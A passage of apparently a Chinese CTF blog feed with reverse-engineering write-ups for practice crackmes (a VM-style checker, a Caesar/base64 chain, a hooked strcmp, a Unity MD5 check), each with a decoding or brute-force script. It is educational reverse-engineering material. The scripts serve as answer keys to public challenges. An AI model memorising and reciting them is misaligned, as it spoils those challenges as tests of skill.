class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( Str[v7 + <span class="number">100</span>] != a1[v9 + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        Str[v5] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v5;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        read(Str);</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v4 = Str[v8] - <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = Str[v8] + <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们会发现第一个参数a1是int，占4位，是dword</p><p>把unk_403040转换成dword形式然后导出。</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dsingal/unk.png" alt="unk"></p><p>这里有几个补码形式的数字，我也不知道ida为什么会逆成这样，总之看最后一位数字就对了</p><p>这里说下几个部分的代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        Str[v6 + <span class="number">100</span>] = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        ++v6;</span><br><span class="line">        ++v8;</span><br></pre></td></tr></table></figure><p>这是将Str[100]和之后的一段空间用来储存v4</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">       <span class="keyword">if</span> ( Str[v7 + <span class="number">100</span>] != a1[v9 + <span class="number">1</span>] )</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">         <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">       &#125;</span><br><span class="line">        ++v7;</span><br><span class="line">       v9 += <span class="number">2</span>;</span><br><span class="line">       <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>这是经过了一段操作，然后将明文加密后的结果和预留密文做比对</p><p>这也说明了是7后面的数字就是密文</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Str[v8]</span><br></pre></td></tr></table></figure><p> 这可以视为一个暂存位，因为后面还需要用Str[v8]进行计算操作存到v4然后经过case 1操作存到Str[100+]</p><p>基本把不明点说的差不多了，写个爆破脚本吧</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> key[] = &#123;<span class="number">34</span>, <span class="number">63</span>, <span class="number">52</span>, <span class="number">50</span>, <span class="number">114</span>, <span class="number">51</span>, <span class="number">24</span>, <span class="number">167</span>, <span class="number">49</span>, <span class="number">241</span>, <span class="number">40</span>, <span class="number">132</span>, <span class="number">193</span>, <span class="number">30</span>, <span class="number">122</span>&#125;;</span><br><span class="line"><span class="type">int</span> a1[] =&#123;<span class="number">4</span>, <span class="number">16</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">3</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">33</span>, <span class="number">1</span>, <span class="number">11</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">81</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">36</span>, <span class="number">1</span>, <span class="number">12</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">54</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="number">65</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">32</span>, <span class="number">8</span>, <span class="number">5</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">3</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">37</span>, <span class="number">1</span>, <span class="number">4</span>, <span class="number">9</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">32</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">65</span>, <span class="number">8</span>, <span class="number">12</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">34</span>, <span class="number">7</span>, <span class="number">63</span>, <span class="number">7</span>, <span class="number">52</span>, <span class="number">7</span>, <span class="number">50</span>, <span class="number">7</span>, <span class="number">114</span>, <span class="number">7</span>, <span class="number">51</span>, <span class="number">7</span>, <span class="number">24</span>, <span class="number">7</span>, <span class="number">167</span>, <span class="number">7</span>, <span class="number">49</span>, <span class="number">7</span>, <span class="number">241</span>, <span class="number">7</span>, <span class="number">40</span>, <span class="number">7</span>, <span class="number">132</span>, <span class="number">7</span>, <span class="number">193</span>, <span class="number">7</span>, <span class="number">30</span>, <span class="number">7</span>, <span class="number">122</span>&#125;;</span><br><span class="line"><span class="type">int</span> v9 = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> v4 = <span class="number">0</span>; </span><br><span class="line"><span class="type">int</span> i, j;</span><br><span class="line"><span class="type">int</span> flag;</span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="number">15</span>; i++, index++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> ( j = <span class="number">48</span>; j &lt; <span class="number">123</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line">flag = j;</span><br><span class="line">v9 = index;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> ( a1[v9] != <span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line"><span class="keyword">switch</span> ( a1[v9] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] + flag;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v4 = flag - a1[v9 + <span class="number">1</span>];</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] ^ flag;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v4 = a1[v9 + <span class="number">1</span>] * flag;</span><br><span class="line">        v9 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        flag = v4;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">       v4 = flag - <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v4 = flag + <span class="number">1</span>;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">if</span> ( v4 == key[i])</span><br><span class="line">    &#123;</span><br><span class="line">    index = v9;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, j);</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"> &#125;</span><br><span class="line">  <span class="built_in">getchar</span> (); </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>index表示的是当前v9的位置，在爆破过程中如果有个数字符合当前操作，需要进行下一个操作，所以需要index暂存一下</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【羊城杯 2020】easyre</title>
      <link href="/2024/07/19/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasyre/"/>
      <url>/2024/07/19/%5B%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%5Deasyre/</url>
      
        <content type="html"><![CDATA[<h1 id="羊城杯-2020-easyre"><a href="#羊城杯-2020-easyre" class="headerlink" title="[羊城杯 2020]easyre"></a>[羊城杯 2020]easyre</h1><h3 id="这题中为了方便，"><a href="#这题中为了方便，" class="headerlink" title="这题中为了方便，"></a>这题中为了方便，</h3><h3 id="第一次加密的密文叫enc1，"><a href="#第一次加密的密文叫enc1，" class="headerlink" title="第一次加密的密文叫enc1，"></a>第一次加密的密文叫enc1，</h3><h3 id="第二次加密后叫enc2，"><a href="#第二次加密后叫enc2，" class="headerlink" title="第二次加密后叫enc2，"></a>第二次加密后叫enc2，</h3><h3 id="第三次加密后叫enc3"><a href="#第三次加密后叫enc3" class="headerlink" title="第三次加密后叫enc3"></a>第三次加密后叫enc3</h3><p>exe差壳无壳ida发现有一串疑似base64的密文和3个加密函数</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%E3%80%91easyre/main.png" alt="main"></p><p>三个，足足三个，刚看还是觉得有点吓人，冷静下来分析</p><p>是明文经过3轮加密变成密文，然后密文和给出的疑似base64的字符进行比对</p><p><strong>所以疑似base64的字符串就是enc3</strong></p><p>先从第三加密个开始分析</p><p>跟进encode_three</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%E3%80%91easyre/enc3.png" alt="en3"></p><p>这是个凯撒加密，大写字母，小写字母，数字分别在自己的范围中替换成<strong>enc2</strong>字母后数第3个字母<strong>（这里的明文是经过前两轮加密后的密文）</strong></p><p>写个脚本给换回来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_cipher</span>(<span class="params">text, shift</span>):</span><br><span class="line">    result = []</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> text:</span><br><span class="line">        <span class="comment"># 如果是大写字母</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;A&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;Z&#x27;</span>:</span><br><span class="line">            new_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>))</span><br><span class="line">            result.append(new_char)</span><br><span class="line">        <span class="comment"># 如果是小写字母</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;a&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;z&#x27;</span>:</span><br><span class="line">            new_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) - shift) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            result.append(new_char)</span><br><span class="line">        <span class="comment"># 如果是数字</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="string">&#x27;0&#x27;</span> &lt;= char &lt;= <span class="string">&#x27;9&#x27;</span>:</span><br><span class="line">            new_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>) - shift) % <span class="number">10</span> + <span class="built_in">ord</span>(<span class="string">&#x27;0&#x27;</span>))</span><br><span class="line">            result.append(new_char)</span><br><span class="line">        <span class="comment"># 其他字符不变</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result.append(char)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(result)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试凯撒密码</span></span><br><span class="line">text = <span class="string">&quot;EmBmP5Pmn7QcPU4gLYKv5QcMmB3PWHcP5YkPq3=cT6QckkPckoRG&quot;</span></span><br><span class="line">shift = <span class="number">3</span></span><br><span class="line">encrypted_text = caesar_cipher(text, shift)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Encrypted Text:&quot;</span>, encrypted_text)</span><br></pre></td></tr></table></figure><hr><p>换过来后跟进第二个加密</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%E3%80%91easyre/enc2.png" alt="enc2"></p><p>这是把<strong>en2分成4个部分</strong>，而<strong>en2</strong>长度刚好是52，<strong>恰好符合每段13个字符</strong></p><p>这段加密是吧明文的4个部分进行了位置交换，</p><p>明文第三段→密文第一段</p><p>明文第一段→密文第二段</p><p>明文第四段→密文第三段</p><p>明文第二段→密文第四段</p><p> <strong>所以只需要把每段密文换回去就能等出enc1</strong></p><hr><p>最后看第一个加密</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%E3%80%91easyre/enc1.png" alt="enc1"></p><p>其中alphabet是标准base64表</p><p>跟进cmove_bits后就是我写的注释内容</p><p>综合来看就是一个标准的base64，</p><p>所以把enc1交给解密网站就好了</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%E3%80%90%E7%BE%8A%E5%9F%8E%E6%9D%AF%202020%E3%80%91easyre/decory.png" alt="decory"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【Hook逆向】【buu】[Zer0pts2020]easy_strcmp</title>
      <link href="/2024/07/19/%E3%80%90buu%E3%80%91%5BZer0pts2020%5Deasy%20strcmp/"/>
      <url>/2024/07/19/%E3%80%90buu%E3%80%91%5BZer0pts2020%5Deasy%20strcmp/</url>
      
        <content type="html"><![CDATA[<h1 id="【buu】-Zer0pts2020-easy-strcmp"><a href="#【buu】-Zer0pts2020-easy-strcmp" class="headerlink" title="【buu】[Zer0pts2020]easy_strcmp"></a>【buu】[Zer0pts2020]easy_strcmp</h1><p>elf文件拖入ida中查看main没啥大用，根据题目跟进strcmp也还是原来的正常的strcmp</p><p>动调看一下发现strcmp的函数变了，</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BZer0pts2020%5Deasy%20strcmp/strcmp.png" alt="strcmp"></p><p>a1是我们要输入的flag，a2是这个要比对的字符串</p><p>第一条语句是要计算a1的长度，抽象吧</p><p>v4是更为抽象的，哪个位运算实际上应当是i&#x2F;8，把a1的字符串8个分为一组</p><p>结合下面的循环会发现 <strong>i&#x3D;24</strong>因为qword_5C2570201060有3组 有用的8位数据</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BZer0pts2020%5Deasy%20strcmp/qword060.png" alt="strcmp"></p><p>qword_5C2570201060[0]是0不用管</p><p>从qword_5C2570201060[1]开始思考</p><p>每次输入的字符串都要和qword_5C2570201060[1]进行相减</p><p>最后的qword_5C2570201090(a1, a2)疑似变成了strcmp</p><p>所以脚本应为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">enc = <span class="string">&quot;********CENSORED********&quot;</span></span><br><span class="line">key = [<span class="number">0x410A4335494A0942</span>, <span class="number">0x0B0EF2F50BE619F0</span>, <span class="number">0x4F0A3A064A35282B</span>]</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line"><span class="comment"># 切片操作</span></span><br><span class="line">    <span class="comment"># sub_string = enc[start:end]</span></span><br><span class="line"><span class="comment"># start: 切片的起始索引（包含该位置）。如果省略，默认为 0。</span></span><br><span class="line"><span class="comment"># end: 切片的结束索引（不包含该位置）。如果省略，默认为字符串的长度。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 获取被加密字符串的一个块，每块 8 个字符</span></span><br><span class="line">    p = enc[<span class="number">8</span>*i:(i+<span class="number">1</span>)*<span class="number">8</span>]</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># b2a_hex 是 binascii 模块中的一个函数，用于将字节串（bytes 类型）转换为十六进制表示的 ASCII 字符串。</span></span><br><span class="line">    <span class="comment"># binascii.b2a_hex(data, sep=b&#x27;&#x27;)</span></span><br><span class="line">    <span class="comment"># data: 需要转换的字节串（bytes 类型）。</span></span><br><span class="line">    <span class="comment"># sep: 分隔符，默认为空字节串（b&#x27;&#x27;），可以指定分隔符（例如空格）。</span></span><br><span class="line">    <span class="comment"># [::-1] 在括号里是用来对 p.encode(&#x27;ascii&#x27;) 的结果进行反转。</span></span><br><span class="line">    <span class="comment"># 这样做是为了先将字符串 p 编码成字节，再将这些字节反转。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将块逆序编码为十六进制字符串</span></span><br><span class="line">    a = binascii.b2a_hex(p.encode(<span class="string">&#x27;ascii&#x27;</span>)[::-<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># a2b_hex 是 binascii 模块中的另一个函数，用于将十六进制表示的 ASCII 字符串转换回字节串（bytes 类型）。</span></span><br><span class="line">    <span class="comment"># binascii.a2b_hex(data)</span></span><br><span class="line">    <span class="comment"># data: 需要转换的十六进制字符串（bytes 类型）。字符串中的每两个字符表示一个字节。</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 将十六进制字符串转回整数，进行加密数据加法，最后转换回字节</span></span><br><span class="line">    b = binascii.a2b_hex(<span class="built_in">hex</span>(<span class="built_in">int</span>(a,<span class="number">16</span>)+key[i])[<span class="number">2</span>:])[::-<span class="number">1</span>]</span><br><span class="line">    flag += b</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure><hr><p>还有个比较容易理解的脚本</p><p>【点击这里】<a href="https://blog.csdn.net/qq_64558075/article/details/121926861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135997916800211590777%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=172135997916800211590777&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-18-121926861-null-null.142">https://blog.csdn.net/qq_64558075/article/details/121926861?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135997916800211590777%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=172135997916800211590777&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-18-121926861-null-null.142</a></p><hr>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>【unity逆向】【buu】[BJDCTF2020]BJD hamburger competition</title>
      <link href="/2024/07/19/%E3%80%90unity%E9%80%86%E5%90%91%E3%80%91%E3%80%90buu%E3%80%91%5BBJDCTF2020%5DBJD%20hamburger%20competition/"/>
      <url>/2024/07/19/%E3%80%90unity%E9%80%86%E5%90%91%E3%80%91%E3%80%90buu%E3%80%91%5BBJDCTF2020%5DBJD%20hamburger%20competition/</url>
      
        <content type="html"><![CDATA[<h1 id="【unity逆向】【buu】-BJDCTF2020-BJD-hamburger-competition"><a href="#【unity逆向】【buu】-BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="【unity逆向】【buu】[BJDCTF2020]BJD hamburger competition"></a>【unity逆向】【buu】[BJDCTF2020]BJD hamburger competition</h1><p>好久没做unity逆向有点忘了</p><hr><p>先说工具，使用ILSpy，这个是github开源项目，</p><p>下载与食用方法：</p><p><a href="https://blog.csdn.net/lilongsy/article/details/130179189?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135563016800227423365%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172135563016800227423365&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-130179189-null-null.142">https://blog.csdn.net/lilongsy/article/details/130179189?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135563016800227423365%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172135563016800227423365&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-1-130179189-null-null.142</a></p><p><a href="https://blog.csdn.net/weixin_44785150/article/details/130591983?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135563016800227423365%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=172135563016800227423365&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-130591983-null-null.142">https://blog.csdn.net/weixin_44785150/article/details/130591983?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522172135563016800227423365%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=172135563016800227423365&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-130591983-null-null.142</a></p><hr><h2 id="BJDCTF2020-BJD-hamburger-competition"><a href="#BJDCTF2020-BJD-hamburger-competition" class="headerlink" title="[BJDCTF2020]BJD hamburger competition"></a>[BJDCTF2020]BJD hamburger competition</h2><p>然后将**~~~~\BJD hamburger competition_Data\Managed\Assembly-CSharp.dll**用ILSpy打开</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BBJDCTF2020%5DBJD%20hamburger%20competition/ILPsy.png" alt="ILPsy"></p><p>（<strong>什么你说不一样，展不开？➕是干什么用的兄弟</strong>）</p><p>发现有个SHA1字符串，如果str经过SHA1加密后是这个字符串就对str进行Md5加密，</p><p>找个在线网站加密去了，交后发现是错的，跟进Md5看一下</p><p><img src="https://hesiy-md-pic.oss-cn-beijing.aliyuncs.com/images/buu/%5BBJDCTF2020%5DBJD%20hamburger%20competition/Md5.png" alt="Md5"></p><p>由于本人没什么C#基础，接下来对关键部分进行解释</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">HashUtil</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> <span class="title">Md5</span>(<span class="params"><span class="built_in">string</span> str</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 将输入字符串转换为字节数组，使用 UTF-8 编码</span></span><br><span class="line">        <span class="built_in">byte</span>[] bytes = Encoding.UTF8.GetBytes(str);</span><br><span class="line">        <span class="comment">// 创建 MD5 哈希算法的实例，并计算字节数组的 MD5 哈希值</span></span><br><span class="line">    <span class="built_in">byte</span>[] hashBytes = MD5.Create().ComputeHash(bytes);</span><br><span class="line">        <span class="comment">// 初始化一个 StringBuilder，用于构建哈希值的十六进制表示</span></span><br><span class="line">        StringBuilder 